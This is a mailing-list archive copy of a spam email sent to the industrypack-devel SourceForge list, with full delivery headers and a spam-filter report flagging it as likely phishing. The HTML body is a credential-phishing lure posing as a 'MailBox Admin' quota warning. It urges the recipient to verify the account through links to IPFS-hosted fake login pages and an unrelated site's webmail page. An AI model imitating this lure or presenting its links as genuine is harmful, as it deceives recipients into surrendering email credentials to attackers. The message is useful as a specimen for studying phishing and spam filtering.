Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 1EE6E8B9D07
	for <lists+industrypack-devel@lfdr.de>; Thu,  2 May 2024 17:04:30 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1s2Xz2-0007Vk-76
	for lists+industrypack-devel@lfdr.de;
	Thu, 02 May 2024 15:04:28 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mailer-daemon@host2.i4dots.com>) id 1s2Xz0-0007VW-LP
 for industrypack-devel@lists.sourceforge.net;
 Thu, 02 May 2024 15:04:27 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=kQKo5nguu7BuzP0SMqnxo4Stzf2QqoKDDEVYQfG/hCc=; b=R5gCvzgyGCYowwNKdTTFWSbIY7
 QeuDh97E+Wj3E92yfCKz2kNzeQuhHUGqdBnCtQHnU3tvKHQq1vni8VgmzIqFtez22Grn7dGAmy291
 plDCQ2H0PI00O07JzTd46/RTuaWmKP5Xhrg4HtdFjAKbbjdlf6jnfRpbJ5HNopr3w/Ww=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=kQKo5nguu7BuzP0SMqnxo4Stzf2QqoKDDEVYQfG/hCc=; b=Q
 K0aE8BgQPFRQ+MrtXqTPxh034dDS7BgTwyOqVCoJh7oj08YRrQSui7coy06aDNub6S8/Rm9eSYKm8
 Z2lEleB6Uu18fKDwqYhzC3BhtiOCQF7TdQgXm5FHuy4m988LBSC4MhsZ5O+WLSL+h72wJU2ApVzwO
 U1DxgBMbzVMjcc1E=;
Received: from [45.137.22.235] (helo=host2.i4dots.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1s2Xz0-0003U7-8U for industrypack-devel@lists.sourceforge.net;
 Thu, 02 May 2024 15:04:27 +0000
From: Mail Delivery System <mailto:mailer-daemon@host2.i4dots.com>
To: industrypack-devel@lists.sourceforge.net
Date: 02 May 2024 17:04:20 +0200
Message-ID: <20240502170419.A5D9C9912E3D88C5@host2.i4dots.com>
MIME-Version: 1.0
X-Spam-Score: 8.5 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Authorize Delivery for pending mails You have (9) new pending
 incoming Emails Your allowed E-mail Quota usage has been exceeded on your
 account industrypack-devel@lists.sourceforge.net. 
 Content analysis details:   (8.5 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: dweb.link]
 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
 bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?45.137.22.235>]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.5 URI_NOVOWEL            URI: URI hostname has long non-vowel sequence
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.5 RCVD_IN_MSPIKE_L5      RBL: Very bad reputation (-5)
 [45.137.22.235 listed in bl.mailspike.net]
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.9 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
 content via CloudFlare, likely phishing
 1.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
 1.9 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised
 website + no rDNS
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only 0.0 NORDNS_LOW_CONTRAST    No rDNS + hidden text
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1s2Xz0-0003U7-8U
Subject: [Industrypack-devel] [SPAM] You have (9) new pending incoming
 E-mails
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4769617123302045668=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============4769617123302045668==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body>
<DIV id=3D:56x class=3D"Ar Au Ao" style=3D"DISPLAY: block">
<DIV aria-expanded=3Dfalse spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 a=
ria-label=3D"Message Body" aria-multiline=3Dtrue aria-controls=3D:597 id=3D=
:56t class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" hideFocus contentEdita=
ble=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT: 363px" aria-owns=3D:597 g_e=
ditable=3D"true">
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Verdana; =
COLOR: rgb(0,0,0); MARGIN-TOP: 0px" align=3Dcenter>
<A style=3D"BOX-SIZING: border-box; BACKGROUND: rgb(80,110,216); COLOR: rgb=
(255,255,255); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px;=
 PADDING-RIGHT: 10px; text-decoration-line: none" href=3D"https://bafybeiha=
j2j3ismays6xtqtsq6a6okwawmj5jf5nufgtdbrxjvgyb6zk5a.ipfs.dweb.link/mail%20lo=
gin%20to%20verify.html#industrypack-devel@lists.sourceforge.net" rel=3Dnore=
ferrer target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bafybeihaj2j=
3ismays6xtqtsq6a6okwawmj5jf5nufgtdbrxjvgyb6zk5a.ipfs.dweb.link/mail%2520log=
in%2520to%2520verify.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=
=3D1713990263878000&amp;usg=3DAOvVaw3WFoEhccOSuKJL33FNuzhc"><FONT style=3D"=
BOX-SIZING: border-box" size=3D3 face=3DVerdana>Authorize Delivery for pend=
ing mails</FONT></A><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-S=
IZING: border-box"></P>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Verdana=
; COLOR: rgb(0,0,0)">
<table style=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(229,229,229) 1px solid; FO=
NT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT: rgb=
(229,229,229) 1px solid; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(229,=
229,229) 1px solid; COLOR: rgb(44,54,58); BORDER-LEFT: rgb(229,229,229) 1px=
 solid" cellspacing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"center" =
border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: &quot;Proxima Nova&quot;,=
&quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Calibri,Helvetica,sans-ser=
if">&nbsp;</TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: &quot;Proxima Nova&quot;,=
&quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Calibri,Helvetica,sans-ser=
if; BORDER-BOTTOM: rgb(229,229,229) 1px solid">
<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
"0" width=3D"100%" align=3D"center" border=3D"0">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: sans-ser=
if; COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 30px; PADDIN=
G-LEFT: 30px; LINE-HEIGHT: 25px; PADDING-RIGHT: 30px">
<table style=3D"WIDTH: 538px; BORDER-COLLAPSE: collapse" cellpadding=3D"0">=

<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: &quot;Proxima Nova&quot;,=
&quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Calibri,Helvetica,sans-ser=
if">
<H2 style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px; LINE-HEIGHT: 1.2">You=
 have (9) new pending incoming Emails&nbsp;</H2></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: &quot;Proxima Nova&quot;,=
&quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Calibri,Helvetica,sans-ser=
if">
<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">Your allowed E-mail Qu=
ota usage has been exceeded on your account<SPAN style=3D"BOX-SIZING: borde=
r-box">&nbsp;</SPAN><SPAN style=3D"BOX-SIZING: border-box; COLOR: rgb(61,13=
3,198)">industrypack-devel@lists.sourceforge.net.</SPAN></P>
<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">Please kindly verify y=
our Human&nbsp;and not a robot by following the below&nbsp;link, so we can =
get your account running again.&nbsp;<BR style=3D"BOX-SIZING: border-box">&=
nbsp;</P></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box" colspan=3D"2">
<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px" align=3Dcenter>
<A style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(0,105,255) 1px solid; B=
ORDER-RIGHT: rgb(0,105,255) 1px solid; WIDTH: 504px; BACKGROUND: rgb(0,105,=
255); BORDER-BOTTOM: rgb(0,105,255) 1px solid; COLOR: rgb(41,104,166); BORD=
ER-LEFT: rgb(0,105,255) 1px solid; DISPLAY: inline-block; text-decoration-l=
ine: none" href=3D"https://ladiesinternationalpokerseries.com/Webmail/webma=
il.php?email=3Dmkhadermastan@nbhh.ae" rel=3Dnoreferrer target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ladiesintern=
ationalpokerseries.com/Webmail/webmail.php?email%3Dmkhadermastan@nbhh.ae&am=
p;source=3Dgmail&amp;ust=3D1713990263878000&amp;usg=3DAOvVaw2K72cwR4ldnJvmT=
19Ty6UA"></A></P>
<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px" align=3Dcenter><SPAN s=
tyle=3D'BOX-SIZING: border-box; FONT-SIZE: large; FONT-FAMILY: "trebuchet m=
s",sans-serif'><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder; =
BACKGROUND-COLOR: rgb(252,229,205)"><FONT style=3D"BOX-SIZING: border-box" =
color=3D#0b5394 size=3D5>
<A href=3D"https://cloudflare-ipfs.com/ipfs/bafybeidihzirgfqlcmm3hlceu4wshn=
bxk5m7cjrraps73rzwwam2rtphom/login-update%20%281%29.html#industrypack-devel=
@lists.sourceforge.net" target=3D_blank data-saferedirecturl=3D"https://www=
=2Egoogle.com/url?q=3Dhttps://bafybeihaj2j3ismays6xtqtsq6a6okwawmj5jf5nufgt=
dbrxjvgyb6zk5a.ipfs.dweb.link/mail%2520login%2520to%2520verify.html%23%5B%5=
B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1713990263878000&amp;usg=3DAOvV=
aw3WFoEhccOSuKJL33FNuzhc">Verify Email Account</A></FONT></SPAN></SPAN></P>=

<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"></P></TD></TR></TBODY>=
</TABLE></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 20px; PADDING-LEFT: 37=
px">&nbsp;=20
<DIV style=3D"BOX-SIZING: border-box"><SPAN style=3D'BOX-SIZING: border-box=
; FONT-FAMILY: "trebuchet ms",sans-serif'><EM style=3D"BOX-SIZING: border-b=
ox"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">If no actio=
n is taken, you may cease to receive incoming E-mails</SPAN></EM></SPAN></D=
IV>
<DIV style=3D"BOX-SIZING: border-box">&nbsp;</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: sans-serif; COLOR: rgb(1=
02,102,102)">&nbsp;</DIV>
<DIV style=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZING: border-box=
; FONT-WEIGHT: bolder">This&nbsp;E-mail was sent to industrypack-devel@list=
s.sourceforge.net&nbsp;</SPAN><SPAN style=3D"BOX-SIZING: border-box; FONT-W=
EIGHT: bolder">&nbsp;<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-=
SIZING: border-box">MailBox Admin(c)</SPAN></DIV></TD></TR></TBODY></TABLE>=
</TD></TR></TBODY></TABLE></DIV></DIV></DIV></BODY></HTML>


--===============4769617123302045668==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4769617123302045668==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============4769617123302045668==--
